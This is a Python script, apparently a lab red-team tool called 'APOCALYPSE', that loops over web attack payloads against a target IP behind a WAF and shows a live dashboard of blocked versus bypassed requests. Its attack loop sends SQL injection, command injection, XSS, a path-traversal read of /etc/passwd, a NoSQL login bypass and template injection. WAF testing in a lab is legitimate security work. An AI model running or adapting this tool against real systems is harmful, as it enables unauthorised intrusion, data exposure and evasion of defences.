#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import random
import os
import sys
import threading
from datetime import datetime
from collections import deque

class RedTeamConsole:
    def __init__(self, target_ip, attacker_ip):
        self.target = target_ip
        self.attacker_ip = attacker_ip
        self.session = requests.Session()

        # İstatistik ve Durum
        self.stats = {
            "total_sent": 0,
            "blocked": 0,
            "bypassed": 0,
            "techniques": {},
            "start_time": datetime.now()
        }

        self.log_buffer = deque(maxlen=12)
        self.is_running = True
        self.banned = False
        self.current_action = "INITIALIZING"

    def add_log(self, technique, status, payload):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if "200" in status:
            color = "\033[92m" # Yeşil
            prefix = "[+]"
        elif "403" in status:
            color = "\033[91m" # Kırmızı
            prefix = "[-]"
        else:
            color = "\033[93m" # Sarı
            prefix = "[!]"

        p_short = (payload[:40] + '..') if len(payload) > 40 else payload
        log_entry = f"{color}{prefix} {timestamp} | {technique:10} | {status:12} | {p_short}\033[0m"
        self.log_buffer.append(log_entry)
        self.stats["techniques"][technique] = self.stats["techniques"].get(technique, 0) + 1

    def render_dashboard(self):
        """Saldırı anındaki canlı konsol ekranı"""
        # Renk Kodları
        RED = "\033[91m"
        GREEN = "\033[92m"
        YELLOW = "\033[93m"
        CYAN = "\033[96m"
        RESET = "\033[0m"
        BOLD = "\033[1m"

        while self.is_running:
            sys.stdout.write("\033[H") # İmleci başa çek
            width = 105
            uptime = str(datetime.now() - self.stats["start_time"]).split('.')[0]

            output = []
            # Header
            output.append(f"{RED}╔" + "═" * (width-2) + f"╗{RESET}")
            output.append(f"{RED}║{RESET}" + f"{BOLD}🚀 APOCALYPSE - AUTONOMOUS ATTACK ENGINE v3.0{RESET}".center(width + 6) + f"{RED}║{RESET}")
            output.append(f"{RED}╠" + "═" * (width-2) + f"╣{RESET}")

            # Üst Bilgi Satırı
            status_line = f" TARGET: {CYAN}{self.target}{RESET} │ UPTIME: {YELLOW}{uptime}{RESET} │ THREADS: {GREEN}ACTIVE{RESET} "
            output.append(f"{RED}║{RESET}" + status_line.center(width + 26) + f"{RED}║{RESET}")

            # İstatistik Satırı
            stats_line = f" SENT: {BOLD}{self.stats['total_sent']}{RESET} │ BLOCKED: {RED}{self.stats['blocked']}{RESET} │ BYPASS: {GREEN}{self.stats['bypassed']}{RESET} "
            output.append(f"{RED}║{RESET}" + stats_line.center(width + 26) + f"{RED}║{RESET}")
            output.append(f"{RED}╠" + "═" * (width-2) + f"╣{RESET}")

            # Canlı Akış Logları
            output.append(f"{RED}║{RESET} " + f"{BOLD}LOG STREAM:{RESET}".ljust(width-3) + f"{RED}║{RESET}")
            for log in list(self.log_buffer):
                # Temiz uzunluk hesaplama
                clean_log = re.sub(r'\033\[[0-9;]*m', '', log)
                output.append(f"{RED}║{RESET} " + log + " " * (width - len(clean_log) - 4) + f"{RED}║{RESET}")

            # Boşluk doldurma
            for _ in range(12 - len(list(self.log_buffer))):
                output.append(f"{RED}║{RESET}" + " " * (width-2) + f"{RED}║{RESET}")

            # Alt Bilgi
            output.append(f"{RED}╚" + "═" * (width-2) + f"╝{RESET}")
            output.append(f" {YELLOW}Action:{RESET} {self.current_action}...".ljust(50))

            sys.stdout.write("\n".join(output) + "\n")
            sys.stdout.flush()
            time.sleep(0.3)

    def show_final_report(self):
        """Saldırı bittiğinde veya ban yendiğinde basılacak profesyonel rapor"""
        os.system('clear')
        duration = str(datetime.now() - self.stats["start_time"]).split('.')[0]
        total = self.stats["total_sent"]
        success_rate = (self.stats["bypassed"] / total * 100) if total > 0 else 0

        # Renkler
        RED = "\033[91m"; GREEN = "\033[92m"; CYAN = "\033[96m"
        YELLOW = "\033[93m"; RESET = "\033[0m"; BOLD = "\033[1m"

        print(f"\n{RED}{BOLD}█" + "▀" * 60 + "█")
        print("█" + " RED TEAM OPERATION FINAL REPORT ".center(60) + "█")
        print("█" + "▄" * 60 + f"█{RESET}")

        print(f"\n {BOLD}Target Info{RESET}     : {CYAN}{self.target}{RESET}")
        print(f" {BOLD}Duration{RESET}        : {duration}")

        status_text = f"{RED}🚫 TERMINATED (IP BANNED / DROPPED){RESET}" if self.banned else f"{GREEN}✅ SUCCESSFUL{RESET}"
        print(f" {BOLD}Mission Status{RESET}  : {status_text}")
        print(f"{RED}" + "─" * 62 + f"{RESET}")

        print(f" {BOLD}{'ATTACK VECTOR':20} │ {'SAMPLES SENT':>15}{RESET}")
        print(f"{RED}" + "─" * 62 + f"{RESET}")

        for tech, count in sorted(self.stats["techniques"].items(), key=lambda x: x[1], reverse=True):
            print(f" {tech:20} │ {count:15} samples")

        print(f"{RED}" + "═" * 62 + f"{RESET}")
        print(f" {BOLD}BYPASS RATE{RESET}     : {YELLOW}{success_rate:.1f}%{RESET}")
        print(f" {BOLD}BYPASS (200 OK){RESET} : {GREEN}{self.stats['bypassed']}{RESET}")
        print(f" {BOLD}BLOCKED (403){RESET}   : {RED}{self.stats['blocked']}{RESET}")
        print(f" {BOLD}TOTAL ATTEMPTS{RESET}  : {BOLD}{total}{RESET}")
        print(f"{RED}{BOLD}█" + "▀" * 60 + "█")
        print("█" + " END OF TRANSMISSION ".center(60) + "█")
        print("█" + "▄" * 60 + f"█{RESET}\n")

    def attack_loop(self):
        payloads = [
            ('SQLi', 'POST', f'http://{self.target}/search', {'id': "1' UNION SELECT 1,2,3--"}),
            ('RCE', 'POST', f'http://{self.target}/admin/exec', {'cmd': "whoami; ls -la"}),
            ('XSS', 'POST', f'http://{self.target}/comment', {'msg': "<svg/onload=alert(1)>"}),
            ('LFI', 'GET', f'http://{self.target}/download', {'file': '/etc/passwd'}),
            ('NoSQL', 'POST', f'http://{self.target}/api/login', {'user': 'admin', 'pass': {"$gt": ""}}),
            ('SSTI', 'POST', f'http://{self.target}/view', {'tpl': "{{config.items()}}"})
        ]

        while self.is_running and not self.banned:
            tech, method, url, data = random.choice(payloads)
            self.current_action = f"INJECTING {tech}"

            try:
                if method == 'POST':
                    res = self.session.post(url, data=data, timeout=2)
                else:
                    res = self.session.get(url, params=data, timeout=2)

                self.stats["total_sent"] += 1
                if res.status_code == 403:
                    self.stats["blocked"] += 1
                    self.add_log(tech, "BLOCKED (403)", str(data))
                elif res.status_code == 200:
                    self.stats["bypassed"] += 1
                    self.add_log(tech, "BYPASS (200)", str(data))
                else:
                    self.add_log(tech, f"HTTP {res.status_code}", str(data))

            except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
                self.banned = True
                self.is_running = False
                break
            except Exception:
                continue

            time.sleep(random.uniform(0.3, 0.7))

    def run(self):
        os.system('clear')
        # Dashboard'u ayrı bir thread'de başlat
        render_thread = threading.Thread(target=self.render_dashboard, daemon=True)
        render_thread.start()

        try:
            self.attack_loop()
        except KeyboardInterrupt:
            self.is_running = False
            self.current_action = "INTERRUPTED BY USER"

        time.sleep(1) # Son halini görmesi için kısa bekleme
        self.show_final_report()

# Modül import hatalarını gidermek için re eklemesi
import re

if __name__ == "__main__":
    # Target: WAF, Attacker: Kali/Attacker IP
    TARGET_IP = "192.168.64.22"
    ATTACKER_IP = "192.168.64.26"

    engine = RedTeamConsole(TARGET_IP, ATTACKER_IP)
    engine.run()